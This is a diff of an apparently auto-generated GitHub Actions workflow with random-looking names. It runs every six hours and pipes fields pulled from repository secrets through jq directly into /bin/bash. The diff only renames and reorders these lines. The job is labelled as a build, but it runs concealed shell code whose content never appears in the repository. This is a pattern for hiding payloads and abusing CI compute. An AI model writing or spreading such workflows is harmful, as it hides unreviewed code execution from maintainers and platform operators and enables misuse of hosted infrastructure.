@@ -1,24 +1,24 @@
 name: nijiuhen6152
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '13 2/6 * * *'
-
+    - cron: '38 0/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: nijiuhen6152
         env:
-          e50: ${{ secrets.e50 }}
+          px94: ${{ secrets.px94 }}
         run: |
-          echo $e50 | jq -r .wjd316 | /bin/bash
-          echo $ujop156 | jq -r .ha69 | /bin/bash
-          echo $nx776 | jq -r .kdoy593 | /bin/bash
-          echo $pe34 | jq -r .twoej81 | /bin/bash
-          echo $amg96028 | jq -r .ur2 | /bin/bash
-          echo $ch00249 | jq -r .j09589 | /bin/bash
-          echo $e1 | jq -r .v535 | /bin/bash
+          echo $px94 | jq -r .ec843 | /bin/bash
+          echo $niel4 | jq -r .ltt8 | /bin/bash
+          echo $szw4429 | jq -r .secx3 | /bin/bash
+          echo $ub0 | jq -r .jew42 | /bin/bash
+          echo $d9356 | jq -r .ciq580 | /bin/bash
+          echo $hy0 | jq -r .ympe7 | /bin/bash
+          echo $cufbz1341 | jq -r .apf4247 | /bin/bash
+          echo $sp254 | jq -r .fppj933 | /bin/bash
 
